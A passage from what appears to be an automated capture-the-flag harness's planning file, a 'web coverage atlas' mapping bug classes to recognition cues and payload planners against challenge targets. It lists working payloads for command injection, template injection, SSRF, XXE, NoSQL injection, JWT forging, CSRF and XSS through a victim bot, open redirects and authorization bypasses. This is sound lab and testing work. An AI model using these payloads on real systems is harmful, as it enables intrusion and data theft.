recon pages: home, robots, /api/clues, /openapi.json; request planner). Stage 1 = concepts the detectors hit (clue keys first), stage 2 = the rest, capped concurrency per host (~3). One flat registry replaces solvers importing each other. Fixture: recorded multi-target pair (D04 LFI + D07 board) with today's prompt for the wrong one.\"},","+  {\"id\": \"recon-crawl-depth2\", \"concept\": \"shared recon planner: robots/sitemap/openapi/comments/clue JSON/links, depth 2 (rows 1, 5, 22)\", \"priority\": 1, \"action\": \"prebuild\", \"detail\": \"Given fetched bodies keyed by path, return next same-origin GETs: robots Allow/Disallow, sitemap <loc>, openapi.json `paths` (fill {id} from submit responses), href/src/action, fetch('/..') literals, HTML-comment paths, every '/...' string in JSON, links on any directory index (depth 2), cap ~40, skip /assets. Parser: proof_[0-9a-f]{32} after JSON/base64/zip/gzip decoding. Fixtures: D01 robots -> index -> .json.bak, D07 openapi with /api/postcards + /postcards/{id}.\"},","+  {\"id\": \"csrf-bot-planner\", \"concept\": \"CSRF executed by the app's victim bot (row 24a)\", \"priority\": 1, \"action\": \"prebuild\", \"detail\": \"D07 proved the GM runs a real moderator browser. CSRF sequel: find the state-changing route (clues *_route, openapi POST/PUT without a token field, forms lacking csrf inputs, cookies SameSite=None/Lax), build (a) an auto-submitting HTML form (GET and POST, urlencoded and text/plain JSON trick) and (b) a fetch(...,{credentials:'include'}) script, deliver it where the bot looks (stored entry, report/share URL endpoint, profile field), then poll the clue/status route or the entry page for the receipt/effect. Token bypasses: drop the token, empty token, token from our own session, GET instead of POST, method override.\"},","+  {\"id\": \"jwt-session-forge\", \"concept\": \"JWT alg:none / leaked-secret HS256 / Flask-itsdangerous / Express s: cookies (rows 7, 8)\", \"priority\": 1, \"action\": \"prebuild\", \"detail\": \"Session family opened on D08. Pure python (hmac, hashlib, base64, json, zlib): decode JWT; produce alg none ('none'/'None'/'NONE', empty sig), HS256 re-signed with secrets FOUND in recon (clues, backups, .env, JS, comments), RS256->HS256 with a published public key (jwks.json). Flask session: base64url(zlib?) payload.timestamp.sig with itsdangerous derive (salt 'cookie-session', HMAC-SHA1) re-signed with a leaked secret. Escalate role/admin/sub (current_role analyst -> admin). No secret brute force beyond what the app leaks.\"},","+  {\"id\": \"role-tamper-planner\", \"concept\": \"client-controlled role: header / query / cookie / JSON body / claim (rows 6, 9)\", \"priority\": 1, \"action\": \"prebuild\", \"detail\": \"Every clue JSON shows current_role: analyst. From recon: role field and values (current_role, role, is_admin, group, tier), app-set cookies, headers named in clues/errors. Plan: cookie role=<admin|staff|owner|higher listed value>, base64-JSON cookie rewrite, X-Role / X-User-Role / X-Forwarded-User, ?role=, JSON role/is_admin on PUT/POST/PATCH to the profile route (mass assignment). Parser: effect+evidence JSON or proof regex.\"},","+  {\"id\": \"dom-xss-sink-scan\", \"concept\": \"DOM XSS: client-side source -> sink (row 13c)\", \"priority\": 1, \"action\": \"prebuild\", \"detail\": \"Third XSS flavour after D06 reflected / D07 stored. Static scan of inline and linked JS for sources (location.hash/search/href, document.referrer, postMessage data, localStorage) flowing into sinks (innerHTML, outerHTML, insertAdjacentHTML, document.write, eval, setTimeout(string), jQuery html()/$(), href/src assignment). Build the URL (#<img src=x onerror=fetch(cb?nonce)>, ?q=, javascript:) and deliver it the way the app expects: GET the callback ourselves with D06 fetch-metadata headers + Referer = crafted URL, or hand the URL to a report/bot endpoint and poll for the receipt.\"},","+  {\"id\": \"cmd-injection-planner\", \"concept\": \"OS command injection to read the mounted proof (row 10)\", \"priority\": 1, \"action\": \"prebuild\", \"detail\": \"For each flagged param (host, ip, target, domain, filename, cmd): separators ; | || && %0a $() backticks, with/without a valid prefix (127.0.0.1), reading the prompt path (default /run/huntress/objective.txt) via cat, `$(cat ...)` echoed, `${IFS}` space bypass. Parser: proof regex in response / tool output block.\"},","+  {\"id\": \"ssti-engine-probe\", \"concept\": \"server-side template injection (row 11)\", \"priority\": 1, \"action\": \"prebuild\", \"detail\": \"Arithmetic markers ({{7*7}}, ${7*7}, <%= 7*7 %>, #{7*7}, {{7*'7'}} -> 7777777 = Jinja2) -> engine; file-read payload per engine for the prompt path: Jinja2 cycler/lipsum/get_flashed_messages __globals__ os.popen, Twig source()/_self.env, ERB File.read, EJS/Handlebars/Nunjucks constructor chains, Freemarker ?new(). Also dump config (SECRET_KEY) to feed jwt-session-forge.\"},","+  {\"id\": \"ssrf-planner\", \"concept\": \"server-side request forgery (row 12)\", \"priority\": 1, \"action\": \"prebuild\", \"detail\": \"URL-taking params (url, link, src, webhook, feed, image, callback). Plan: file:///run/huntress/objective.txt, http://127.0.0.1 / localhost / 0.0.0.0 / [::1] / 2130706433 / 127.1 + the clue routes (secondary_route is often the 'internal' one), named internal ports, 169.254.169.254 only if named, redirect and @-userinfo allowlist bypasses. Parser: proof regex in the preview body.\"},","+  {\"id\": \"open-redirect-planner\", \"concept\": \"open redirect / OAuth redirect_uri (row 24b)\", \"priority\": 1, \"action\": \"prebuild\", \"detail\": \"Params next, return, returnTo, redirect, url, continue, redirect_uri, callback on login/logout/OAuth routes. Payloads: //evil, /\\\\evil, https:evil, %2F%2Fevil, /%09/evil, https://<base>@evil, javascript: (if the sink is client-side), plus the clue route as an internal target. Detect via Location header (don't follow) or meta-refresh/JS; when OAuth, leak the code/token to a clue route and replay it. Parser: effect JSON / proof.\"},","+  {\"id\": \"header-trust-verb-path-bypass\", \"concept\": \"IP/header trust, method override, path normalisation (rows 15-17)\", \"priority\": 2, \"action\": \"prebuild\", \"detail\": \"For a route that 401/403/405s: X-Forwarded-For / X-Real-IP / X-Client-IP / True-Client-IP / Forwarded: for=127.0.0.1; X-Original-URL / X-Rewrite-URL; methods HEAD/POST/PUT/PATCH/OPTIONS + X-HTTP-Method-Override / _method; path variants /ADMIN, /admin/, /admin/., //admin, /./admin, /admin;/, /%61dmin, /admin..;/, trailing ?/#. Stop at the first 200 with proof or effect.\"},","+  {\"id\": \"cors-misconfig-probe\", \"concept\": \"CORS reflected Origin with credentials (row 24c)\", \"priority\": 2, \"action\": \"prebuild\", \"detail\": \"Request the clue data routes with Origin: https://evil.example, null, <base>.evil.example, sub.<base>; flag ACAO echoing + ACAC true. Exploit via the victim bot: stored/bot-visited script fetch(DATA,{credentials:'include'}) from a cross-origin page and POST to the app's receipt route; or the app may judge it server-side by the Origin header (effect JSON).\"},","+  {\"id\": \"session-id-weakness\", \"concept\": \"session hijack: predictable / leaked / non-rotated session ids (row 32)\", \"priority\": 2, \"action\": \"prebuild\", \"detail\": \"D08 sequel. Collect every session-like value the app reveals (Set-Cookie, clue hints, URLs, /api/history, logs pages, Referer leaks); detect structure (sequential int, timestamp, md5(user), base64 JSON); plan reuse of a leaked victim id as arena_session/sid cookie and a logout-then-reuse check. Never guess beyond values the app derives from data it shows.\"},","+  {\"id\": \"xxe-payloads\", \"concept\": \"XML external entities (row 18)\", \"priority\": 2, \"action\": \"prebuild\", \"detail\": \"XML endpoints/uploads: in-band entity on the prompt path, parameter-entity variant, php://filter base64, XInclude, SVG / DOCX (zipfile) container builder carrying the entity. Parser: proof regex, base64 decode.\"},","+  {\"id\": \"upload-execution-planner\", \"concept\": \"file upload to execution or traversal (row 20)\", \"priority\": 2, \"action\": \"prebuild\", \"detail\": \"Extension probing (shell.php.jpg, .phtml/.php5, case, trailing dot), content-type/magic spoof (GIF89a), filename traversal, SVG with script/XXE, template files if uploads are rendered. Payload only reads the prompt path. Parser: find the stored URL, fetch it, proof regex.\"},","+  {\"id\": \"nosql-operator-injection\", \"concept\": \"MongoDB-style operator injection (row 19)\", \"priority\": 2, \"action\": \"prebuild\", \"detail\": \"JSON bodies: {\\\"$ne\\\":null}, {\\\"$gt\\\":\\\"\\\"}, {\\\"$regex\\\":\\\".*\\\"}; form username[$ne]=x; $where only when Mongo-flavoured. Field names from the form/JS. Parser: proof or an admin page with the returned session.\"},","+  {\"id\": \"vcs-debug-leak-reader\", \"concept\": \"exposed .git / .env / DEBUG pages (row 22)\", \"priority\": 2, \"action\": \"prebuild\", \"detail\": \"Probe /.git/HEAD, /.git/config, /.env, /.DS_Store, /debug, /actuator/env, /phpinfo.php within the capped recon list. Parser: .git loose objects (zlib) -> commit -> tree -> blob, .DS_Store names, Django DEBUG 404 URL list, .env secrets -> jwt-session-forge.\"},","+  {\"id\": \"sqli-union-blind\", \"concept\": \"UNION / error / boolean-blind SQLi (row 28)\", \"priority\": 2, \"action\": \"prebuild\", \"detail\": \"ORDER BY / NULL-count columns, UNION SELECT with table names from errors or sqlite_master / information_schema, marker-based string column, boolean-blind with a length-diff oracle (bounded, [0-9a-f_proof], 32 chars). Login bypass admin'--. SQLite/MySQL/Postgres dialects.\"},","+  {\"id\": \"graphql-introspection\", \"concept\": \"GraphQL schema leak / hidden field (row 23)\", \"priority\": 2, \"action\": \"prebuild\", \"detail\": \"Introspection query, list fields, query hidden ones (proof, secret, evidence, note) and node(id) lookups (IDOR over GraphQL); field suggestions when introspection is off.\"},","+  {\"id\": \"lfi-filter-bypass\", \"concept\": \"traversal filters / suffix / prefix rules (row 29)\", \"priority\": 2, \"action\": \"prebuild\", \"detail\": \"Planner from D04's set: nested strip (....//, ..././), URL / double / overlong encodings, backslash, required prefix (pages/../../..), appended suffix (%00, ?, #, php://filter), absolute, file://, /proc/self/cwd and /proc/self/root. Cheapest first; decode base64 filter output.\"},","+  {\"id\": \"prototype-pollution\", \"concept\": \"server-side prototype pollution (row 25)\", \"priority\": 2, \"action\": \"prebuild\", \"detail\": \"Node-flavoured JSON merge/settings routes: {\\\"__proto__\\\":{\\\"isAdmin\\\":true,\\\"role\\\":\\\"admin\\\"}}, {\\\"constructor\\\":{\\\"prototype\\\":{...}}}, query-string a[__proto__][x]=1; then re-request the clue/status route. Detect via a reflected polluted key (e.g. json spaces / status code gadgets).\"},","+  {\"id\": \"deserialization-gadgets\", \"concept\": \"pickle / PHP / node-serialize cookies (row 21)\", \"priority\": 3, \"action\": \"prebuild\", \"detail\": \"Recognise base64 cookies gASV/gAN (pickle), Tzo/YTo (PHP), {\\\"rce\\\" / _$$ND_FUNC$$_ (node-serialize), rO0 (Java). Prefer data tampering (isAdmin/role) over code execution; minimal gadget reading the prompt path otherwise.\"},","+  {\"id\": \"logic-race-reset\", \"concept\": \"business logic, race, predictable reset tokens (rows 26, 27)\", \"priority\": 3, \"action\": \"prebuild\", \"detail\": \"Numeric fields (negative, zero, huge, float), coupon/redeem replay, ~20-request parallel burst for a single-use action, reset tokens the app leaks (timestamp, md5(email), sequential). No credential guessing.\"},","+  {\"id\": \"cache-host-header\", \"concept\": \"web cache poisoning / Host-header attacks (row 30)\", \"priority\": 3, \"action\": \"prebuild\", \"detail\": \"Unkeyed headers (X-Forwarded-Host, X-Host, X-Forwarded-Scheme, X-Original-URL) reflected into cached responses (Age/X-Cache/CF-Cache-Status) or password-reset links; plan: poison with the clue callback route, then fetch as the victim/bot path. Cloudflare sits in front, so key on app-level cache headers only.\"},","+  {\"id\": \"record-target-responses\", \"concept\": \"replayable live-target cases\", \"priority\": 1, \"action\": \"note\", \"detail\": \"Targets 410 after CORRECT; D07 Mastery's proof-2 fix could only be tested on a hand-built mock. Harness: log every target request/response during single/TT/Mastery into solver/cases/<case>/http/ and let solve.py replay them when the host 410s; also the fixture source for the web prebuild.\"},","+  {\"id\": \"stopgate-503-already-solved\", \"concept\": \"harness: a 503 submit that landed leaves the stop gate closed\", \"priority\": 1, \"action\": \"note\", \"detail\": \"D07 Mastery: submit returned HTTP 503 temporarily_unavailable though the GM registered CORRECT; the retry returned already_solved and stop_gate.py (counts only accepted/correct rows) never released. Owner of hctf/: after a 503, check op=status before retrying, and count already_solved for the owed attempt as done. Same for unverified live variants with expected.json {} (D08 Mastery).\"},","+  {\"id\": \"headless-browser\", \"concept\": \"client-side JS execution for DOM XSS / CSRF checks (rows 13c, 24a)\", \"priority\": 2, \"action\": \"tool\", \"detail\": \"D06-D07 needed none (server-judged headers; GM-side bot). Install only if a day demands local JS execution: `uv pip install --python .venv/bin/python playwright && .venv/bin/playwright install chromium` (or system chromium --headless --dump-dom).\"}"," ]"," ```"]}],"originalFile":"# Web coverage atlas\n\nLane: a LIVE challenge-owned target per question (`targets[{id:\"Target N\", url}]`, no artifact), one `proof-N`\nquestion per target, answer = the token `proof_<32 hex>` the app prints once the bug is exploited (`trim`). One\nclassic OWASP-style bug per lane-day, named by a title pun: D01 exposed backup (robots `Disallow` -> index ->\n`.json.bak`), D02 IDOR, D03 SQLi (paren-wrapped LIKE), D04 path traversal to the prompt-named file\n`/run/huntress/objective.txt`, D05 unprotected \"feature route\" named by `/api/clues` (missing function-level authz;\nJSON `effect: framework_authorization_bypassed`, `evidence: proof_...`). Mastery = today's bug + one earlier\nlane-day's bug on a second target (D01 twice so far), described only by today's prompt. Release pace: lane-days\nD01-D03 on calendar day 19 and D04-D05 on day 20, so expect 2-3 new bugs per calendar day. The arc so far runs\ninfo-disclosure -> broken access control (object) -> injection (SQL) -> file read -> broken access control\n(function). Next most likely: the remaining OWASP classics that a proof file or a JSON `effect` can demonstrate:\nOS command injection, SSTI, SSRF, auth/session forgery (JWT / cookie / role claim, mass assignment), header-trust\nbypasses, XSS, XXE, upload. File-read bugs reuse the prompt's mounted proof path.\nSnapshot 2026-10-20 (after D05; first atlas for the lane; `hctf prebuild` has NO `web` lane config yet, see gap\n`enable-web-prebuild-lane`).\n\nStatus legend: `seen Dnn` = GM-confirmed lane-day (solver in `challenges/<cal-day>/web-*/solver/solve.py`).\n`gap` = nothing reusable in lib (each day's solver re-implements fetch + regex). Allowed prebuild imports exclude\n`urllib.request`, so prebuilt web modules must be PURE: given page/JSON bodies -> a request plan\n`[(method, path, headers, body)]`; given a response -> proof or next hints. The solver does the fetching.\n\n## Coverage table\n\n| # | concept | status | recognition cues | first move | likelihood next 3 cal. days |\n|---|---|---|---|---|---|\n| 1 | exposed backup / forced browsing via robots | seen D01 (Mastery D03, D04) | robots `Disallow: /<word>-<hex>/`, comment \"crawler policy\", \"diary\", \"archive\", \"forgot to clean up\" | robots -> index -> every link (depth 2) | done; keeps returning in Mastery |\n| 2 | IDOR (object-level authz) | seen D02 | \"Signed in as\", `/<things>/<id>`, `fetch('/api/<things>/'+id)`, \"someone else's row\" | foreign ids from `/api/history`-style feeds | done; Mastery |\n| 3 | SQL injection (UNION-less tautology) | seen D03 | search form, \"database\", \"one pointed question\" | `zz') OR 1=1 --` family | done; Mastery |\n| 4 | path traversal / LFI | seen D04 | `?doc=`/`?page=`/`?file=` with filename value, \"directory\", \"boundary\", \"mounted at /path\" | `../`*10 + prompt path | done; Mastery |\n| 5 | missing function-level authz (unlinked route) | seen D05 | \"staff-only\", \"sign, no lock\", \"bouncer\", `/api/clues` `feature_route`, `current_role` | GET the clue route | done; Mastery |\n| 6 | role / privilege via client-controlled header, query or cookie | gap (D05 solver tries X-Role / `?role=admin` / `role=admin` cookie) | `current_role` in clues, `role=` cookie, `X-User-Role` mention | flip the value the app names | high: D05 sequel \"now there is a lock\" |\n| 7 | JWT tampering (`alg:none`, weak/leaked HS256 secret, kid/jku) | gap | 3 base64url parts in cookie / `Authorization`, \"token\", \"signature\" | decode; resign with `none` or the leaked secret | high |\n| 8 | signed-cookie / session forgery (Flask `itsdangerous`, Express `s:`, base64 JSON cookie) | gap | `session=eyJ...` dot parts, `s%3A` prefix, base64 JSON cookie | decode; re-sign if the secret leaks (backup, .env, clues) | high |\n| 9 | mass assignment / over-posting | gap | JSON profile update, `is_admin`/`role` in GET but not in the form | add `role:\"admin\"` / `is_admin:true` to PUT/POST | high |\n| 10 | OS command injection | gap | \"ping\", \"lookup host\", \"diagnostics\", \"convert\", tool output in page | `;cat /run/huntress/objective.txt`, `|`, `$()`, backticks, `%0a` | high |\n| 11 | SSTI (Jinja2 / Twig / ERB / EJS / Handlebars) | gap | \"template\", \"preview\", \"greeting card\", `{{7*7}}` -> 49 | engine probe then file-read gadget | high |\n| 12 | SSRF | gap | \"fetch URL\", \"preview link\", \"webhook\", \"import from URL\", \"internal\" | `http://127.0.0.1:<port>/...`, `file:///run/...`, the internal host the app names | high |\n| 13 | XSS (reflected / stored / DOM) | gap | \"comment\", \"guestbook\", \"report to admin\", reflected param in HTML | reflected marker, then `<script>` / handler; app may return `effect` JSON or need a bot | med-high (proof needs a bot or server-side check) |\n| 14 | default / leaked credentials login | gap | login form, creds in comment / backup / JS / README | use the leaked pair; vendor default only (no brute force) | med-high |\n| 15 | auth bypass by header trust (`X-Forwarded-For: 127.0.0.1`, `X-Original-URL`, `X-Forwarded-Host`) | gap | \"internal only\", \"localhost only\", 403 with IP in message | spoof the header the error names | med-high |\n| 16 | HTTP verb / method-override tampering | gap | 405/403 on GET, `X-HTTP-Method-Override`, `_method=` | HEAD/POST/PUT/OPTIONS + overrides | med |\n| 17 | path-normalisation authz bypass (`/admin/..;/`, `//admin`, `%2e`, case, trailing `.`/`/`) | gap | 403 on a named route, proxy in front (`Server:`/`Via:`) | normalisation variants of the blocked path | med |\n| 18 | XXE | gap | XML upload/import, `Content-Type: application/xml`, SOAP, SVG/DOCX upload | external entity `file:///run/huntress/objective.txt` | med |\n| 19 | NoSQL injection (Mongo operators) | gap | JSON login, \"MongoDB\", `username[$ne]=` | `{\"$ne\": null}`, `$regex`, `$gt:\"\"` | med |\n| 20 | file upload -> webshell / served file | gap | upload form, \"avatar\", \"attachments\", files served back | upload a script/template the server executes or a path-traversal filename | med |\n| 21 | insecure deserialization (pickle / PHP `O:` / node-serialize / Java `rO0`) | gap | base64 cookie starting `gASV`/`Tzo`/`rO0`/`{\"rce\"` | craft a gadget that reads the proof file | med-low |\n| 22 | exposed VCS / env / debug (`/.git/`, `/.env`, Werkzeug/Django DEBUG, actuator, phpinfo) | gap | `X-Powered-By`, DEBUG 404 page listing routes, `/.git/HEAD` 200 | fetch the leak, reconstruct `.git` objects | med (D01 cousin) |\n| 23 | GraphQL introspection / hidden field | gap | `/graphql`, `{\"data\":` | `__schema` query, then the hidden field | med |\n| 24 | open redirect / CORS / CSRF | gap | `?next=`, `Access-Control-Allow-Origin` reflecting | prove with the app's `effect` response | low (hard to prove with a static proof) |\n| 25 | prototype pollution (Node) | gap | JSON merge endpoint, \"settings\", Node banner | `{\"__proto__\":{\"isAdmin\":true}}` | med-low |\n| 26 | race condition / business logic (negative qty, coupon reuse, price tamper) | gap | shop / wallet / voucher | parallel requests, negative/overflow values in the app's own form | med-low |\n| 27 | password-reset / predictable token / OTP | gap | \"forgot password\", token in response, sequential/time-based token | read the token the app leaks; no brute force | med-low |\n| 28 | UNION / error / blind SQLi | gap (D03 needed only a tautology) | numeric id param, DB errors shown | `ORDER BY` count, `UNION SELECT`, boolean diff | med (SQLi sequel) |\n| 29 | LFI filters (`../` stripped, suffix appended, prefix required, encoding) | partial (D04 solver tries `....//`, `..%2f`, `php://filter`, prefixed) | traversal returns \"not allowed\" / `.php` appended | double encoding, `%00`, `....//`, `pages/../../`, wrappers | med (TT/Mastery sequel) |\n| 30 | HTTP request smuggling / cache poisoning / host-header | gap | proxy + cache headers, password-reset links using Host | `X-Forwarded-Host`, CL/TE | low |\n| 31 | static web evidence (HAR, pcap, access logs, web shell, minified JS) | gap (never released; skill covers it) | `.har`, pcap magic, combined-log lines, `eval(gzinflate(base64_decode(` | jq / tshark / decode layers | low (the lane is live-target so far) |\n\n## Recognition cues (worker quick-reference)\n\n```\nFIRST 60 SECONDS ON ANY TARGET (all cheap, do them in parallel, curl --max-time 20 -A 'Mozilla/5.0'):\n  GET /            -> links, forms, inline JS fetch('/api/..'), HTML comments, \"Signed in as\", pills, footer banner\n  GET /robots.txt  -> Disallow paths (D01): fetch each, then EVERY link on what it returns (depth 2)\n  GET /sitemap.xml, /api/clues, /api, /api/history  -> app-narrated routes / roles / ids (D02, D05)\n  regex  proof_[0-9a-f]{32}  over EVERY body (JSON-decode, base64-decode, unzip first). JSON `evidence` = answer.\n  410 {\"state\":\"completed\"} = attempt already solved; `preparing` = target not ready, re-poll hctf status.\nMASTERY: 2 targets, prompt describes only today's bug -> run every concept probe on every target.\n\nPROMPT / PAGE CUE                                     -> BUG                -> FIRST REQUEST\n\"backup\", \"diary\", \"archive\", \"forgot to clean up\"     -> exposed backup     -> robots Disallow -> index -> .bak/.zip\n\"neighbor's records\", \"somebody else's row\", ids       -> IDOR               -> foreign id from feed into the API template\nsearch box, \"database\", \"one pointed question\"         -> SQLi               -> q=zz') OR 1=1 --   (+ ' \" )) # variants)\n\"stay inside its directory\", ?doc=/?page=/?file=      -> traversal/LFI      -> ?doc=../../../../../../../../../../run/huntress/objective.txt\n\"staff-only door, no lock, just a sign\", current_role  -> unprotected route  -> GET /api/clues feature_route\ncurrent_role / role cookie / X-*-Role mention          -> role tampering     -> set the named value to admin\neyJ...eyJ...sig in cookie/Authorization               -> JWT                -> alg none / leaked secret, role claim\n\"ping\", \"host lookup\", \"diagnostics\", \"convert\"       -> command injection  -> ;cat /run/huntress/objective.txt  (| $() ` %0a)\n\"template\", \"preview\", \"greeting\", {{7*7}}=49          -> SSTI               -> engine probe -> file read\n\"fetch URL\", \"preview link\", \"webhook\", \"import\"      -> SSRF               -> http://127.0.0.1/<named path>, file:///run/...\n\"profile\", JSON PUT, is_admin in GET only              -> mass assignment    -> add role/is_admin to the body\n\"internal only\", \"localhost only\"                      -> header trust       -> X-Forwarded-For: 127.0.0.1 (+ X-Real-IP, X-Original-URL)\nXML/SVG/DOCX upload, application/xml                   -> XXE                -> <!ENTITY x SYSTEM \"file:///run/huntress/objective.txt\">\nJSON login, Mongo                                     -> NoSQLi             -> {\"username\":{\"$ne\":null},\"password\":{\"$ne\":null}}\n\"comment\", \"guestbook\", \"report to admin\"              -> XSS                -> reflected marker first; look for an `effect` reply\nupload form, files served back                         -> upload             -> server-executed type or ../ filename\n/.git/HEAD 200, /.env, DEBUG page                      -> VCS/debug leak     -> fetch, reconstruct, read secret -> forge\nThe prompt names an absolute path (/run/huntress/objective.txt): ANY file-read primitive should aim there.\nBanners (\"Django\", \"Node.js\", \".php\") are costume; the title pun names the bug.\n```\n\n## Readiness gaps\n\nPriority 1 = plausible within ~3 calendar days (at 2-3 lane-days per day that is ~6-9 new bugs). \"prebuild\" = pure\npython in a future `lib/web.py` (request planner + response parser, no I/O; the solver fetches) with offline\nfixtures = recorded bodies incl. a decoy. \"note\" = harness/prompt change. \"tool\" = install. None built yet (no\n`web:*` keys in `.run/prebuild-state.json`).\n\n```json\n[\n  {\"id\": \"enable-web-prebuild-lane\", \"concept\": \"harness: web is not a prebuild lane\", \"priority\": 1, \"action\": \"note\", \"detail\": \"hctf/prebuild.py LANES has no `web` entry, so none of the prebuild gaps below can drain. Owner of hctf/: add `web: {brief: prebuild_web, writable: (lib/web.py, tests/data/web_fixtures/), targets: tests/data/web_fixtures/TARGETS.json, gate: (tests/test_lane_fixtures.py,), regress_lane: web, requires: (lib/web.py:plan,)}` plus a minimal lib/web.py with `plan(pages) -> [requests]` and `find_proof(body) -> str|None`. Fixtures = saved target responses (the targets 410 after CORRECT, so record them during the single solve).\"},\n  {\"id\": \"recon-crawl-depth2\", \"concept\": \"shared recon planner: robots/sitemap/comments/clue JSON/links, depth 2 (rows 1, 5, 22)\", \"priority\": 1, \"action\": \"prebuild\", \"detail\": \"The D04 Mastery miss. Pure function: given fetched bodies keyed by path, return the next same-origin GETs: robots Allow/Disallow paths, sitemap <loc>, href/src/action, fetch('/..') and axios/XHR literals in inline JS, HTML-comment paths, every string value starting with '/' in JSON (clues, history, config), plus links on any fetched directory index (depth 2), capped ~40 requests, skipping /assets and static images. Parser: proof_[0-9a-f]{32} over bodies after JSON / base64 / zip / gzip decoding. Fixtures: D01-style robots -> index -> .json.bak (proof one link deeper), D05-style /api/clues -> feature_route, decoy release-notes.txt.\"},\n  {\"id\": \"mastery-concept-dispatcher\", \"concept\": \"run every known lane concept on every target (Mastery mixes days)\", \"priority\": 1, \"action\": \"prebuild\", \"detail\": \"Registry in lib/web.py: concept -> (cheap detector over the recon pages, request planner). Order by detector hits, not prompt keywords: backup crawl, clue routes, IDOR feed ids, LFI params, SQLi forms, then role tampering, command injection, SSTI, SSRF. The per-day solve.py calls `dispatch(pages)` instead of importing earlier days' solvers one by one (D05 did that via fallback()). Fixture: a two-target recorded pair where target 1 is D01-style and the prompt is an LFI prompt.\"},\n  {\"id\": \"role-tamper-planner\", \"concept\": \"client-controlled role: header / query / cookie / JSON body / JWT claim (rows 6, 9)\", \"priority\": 1, \"action\": \"prebuild\", \"detail\": \"D05 had current_role: analyst and a route that needed nothing; the sequel likely enforces a role the client controls. From recon: the role field name and value the app shows (current_role, role, is_admin, group, tier), cookies set by the app, headers named in clues/errors. Plan: cookie role=<admin|staff|owner|the higher value the app lists>, base64-JSON cookie rewrite, X-Role / X-User-Role / X-Forwarded-User, ?role=, JSON body role/is_admin on PUT/POST/PATCH to the profile endpoint. Parser: `effect` + `evidence` JSON or proof regex.\"},\n  {\"id\": \"jwt-session-forge\", \"concept\": \"JWT alg:none / leaked-secret HS256 / Flask-itsdangerous / Express s: cookies (rows 7, 8)\", \"priority\": 1, \"action\": \"prebuild\", \"detail\": \"Pure python (hmac, hashlib, base64, json, zlib): decode JWT header/claims; produce alg none (+ 'None'/'NONE', empty sig), HS256 re-signed with secrets FOUND in recon (backup files, .env, clue JSON, JS bundles, comments), RS256->HS256 with a published public key (jwks.json, /.well-known). Flask session: base64url(zlib?) payload . timestamp . sig with itsdangerous key derivation (salt 'cookie-session', HMAC-SHA1 derive) re-signed with a leaked secret. Escalate role/admin/sub claims. No secret brute force beyond secrets the app itself leaks.\"},\n  {\"id\": \"cmd-injection-planner\", \"concept\": \"OS command injection to read the mounted proof (row 10)\", \"priority\": 1, \"action\": \"prebuild\", \"detail\": \"For each form/param the detector flags (host, ip, target, domain, filename, cmd): payloads with separators ; | || && %0a $() backticks, with/without a valid prefix value (127.0.0.1), reading the prompt-named path (default /run/huntress/objective.txt) via cat, also `$(cat ...)` echoed into output and `${IFS}` space bypass. Parser: proof regex in the response or in the reflected tool output block.\"},\n  {\"id\": \"ssti-engine-probe\", \"concept\": \"server-side template injection (row 11)\", \"priority\": 1, \"action\": \"prebuild\", \"detail\": \"Probe each reflected text field with arithmetic markers ({{7*7}}, ${7*7}, <%= 7*7 %>, #{7*7}, {{7*'7'}} -> 7777777 means Jinja2) and map the result to the engine; then a file-read payload per engine for the prompt path: Jinja2 cycler.__init__.__globals__.os.popen / get_flashed_messages.__globals__ / lipsum.__globals__, Twig _self.env / source(), ERB File.read, EJS/Handlebars/Nunjucks constructor chains, Freemarker ?new(). Also try reading app config (config.items(), SECRET_KEY) to feed jwt-session-forge.\"},\n  {\"id\": \"ssrf-planner\", \"concept\": \"server-side request forgery (row 12)\", \"priority\": 1, \"action\": \"prebuild\", \"detail\": \"Detect URL-taking params/forms (url, link, src, webhook, feed, image, callback). Plan: file:///run/huntress/objective.txt, http://127.0.0.1 / localhost / 0.0.0.0 / [::1] / 2130706433 / 127.1 on the target's own and named internal ports and paths (from clues/comments: /internal, /admin, /metadata), http://169.254.169.254/latest/meta-data/ only if the app names it, redirect-scheme and @-userinfo bypasses for an allowlist. Parser: proof regex in the fetched-preview body.\"},\n  {\"id\": \"header-trust-verb-path-bypass\", \"concept\": \"IP/header trust, method override, path normalisation (rows 15-17)\", \"priority\": 1, \"action\": \"prebuild\", \"detail\": \"For a route that 401/403/405s: X-Forwarded-For / X-Real-IP / X-Client-IP / True-Client-IP / Forwarded: for=127.0.0.1; X-Original-URL / X-Rewrite-URL with the blocked path; methods HEAD/POST/PUT/PATCH/OPTIONS and X-HTTP-Method-Override / _method; path variants /ADMIN, /admin/, /admin/., //admin, /./admin, /admin;/, /%61dmin, /admin..;/, /admin%2f, trailing ?/#. Stop at the first 200 carrying proof or effect JSON.\"},\n  {\"id\": \"xss-effect-probe\", \"concept\": \"reflected / stored / DOM XSS proven by the app (row 13)\", \"priority\": 2, \"action\": \"prebuild\", \"detail\": \"Reflect a unique marker in every param/form; classify the sink context (HTML text, attribute, JS string, URL) from the response; build a context-correct payload (<script>, \\\"><img src=x onerror=...>, '-alert(1)-', javascript:). The GM likely checks server-side (as D05 returned effect JSON) or via a report-to-admin bot endpoint: submit the payload URL there and poll the page/API for proof. Static DOM-XSS: scan inline JS for location.hash/search -> innerHTML/eval sinks.\"},\n  {\"id\": \"xxe-payloads\", \"concept\": \"XML external entities (row 18)\", \"priority\": 2, \"action\": \"prebuild\", \"detail\": \"For XML endpoints/uploads (application/xml, SOAP, SVG, DOCX/XLSX word/document.xml): classic in-band entity on the prompt path, parameter-entity variant, php://filter base64 for PHP, XInclude when the DOCTYPE is not controllable, and an SVG / DOCX container builder (zipfile) carrying the entity. Parser: proof regex, base64 decode.\"},\n  {\"id\": \"nosql-operator-injection\", \"concept\": \"MongoDB-style operator injection (row 19)\", \"priority\": 2, \"action\": \"prebuild\", \"detail\": \"JSON login/search bodies: {\\\"$ne\\\":null}, {\\\"$gt\\\":\\\"\\\"}, {\\\"$regex\\\":\\\".*\\\"}, {\\\"$exists\\\":true}; form-encoded username[$ne]=x; `$where` only when the app is Mongo-flavoured. Pick the field names from the form/JS. Parser: proof regex or a role/admin page reached with the returned session.\"},\n  {\"id\": \"upload-execution-planner\", \"concept\": \"file upload to execution or traversal (row 20)\", \"priority\": 2, \"action\": \"prebuild\", \"detail\": \"From an upload form: allowed-extension probing (double extension shell.php.jpg, .phtml/.php5, case, trailing dot, null byte), content-type/magic spoof (GIF89a prefix), filename traversal (../../), SVG with script/XXE, template files (.html/.ejs) if the app renders uploads. Payload only reads the prompt-named proof path. Parser: locate the stored URL in the response, fetch it, proof regex.\"},\n  {\"id\": \"vcs-debug-leak-reader\", \"concept\": \"exposed .git / .env / DEBUG 